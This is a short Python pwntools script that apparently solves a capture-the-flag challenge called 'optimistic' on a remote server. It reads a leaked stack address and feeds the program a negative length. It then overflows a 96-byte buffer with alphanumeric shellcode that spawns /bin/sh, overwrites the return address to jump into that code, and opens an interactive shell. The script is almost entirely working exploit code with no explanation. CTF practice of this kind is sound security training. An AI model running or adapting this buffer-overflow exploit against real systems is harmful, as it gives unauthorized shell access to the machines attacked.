# 46.101.63.43:32136

from pwn import *

context.arch = 'x86_64'

# p = process('./optimistic')
p = remote('46.101.63.43', 32136)
print(p.recv())
p.sendline('y')
addressText = p.recv()
ebpAddress = int(addressText.decode(
    'latin-1').split('\n')[0].split(' ')[-1], 0)
print(addressText)
p.sendline('email')
print(p.recv())
p.sendline('45')
print(p.recv())
p.sendline('-1')
print(p.recv())

bufSize = 96
extra = 8

# shellcode = shellcraft.amd64.linux.cat('flag.txt')
# alphabetic shellcode spawns /bin/sh
shellcode = 'XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V'
# payload = asm(shellcode)
payload = shellcode.encode('latin-1')
padding = bufSize - len(payload)
payload += ("A" * padding).encode('latin-1')
payload += ("A" * extra).encode('latin-1')
payload += p64(ebpAddress - 96)

p.sendline(payload)
print(p.recv())
p.interactive()
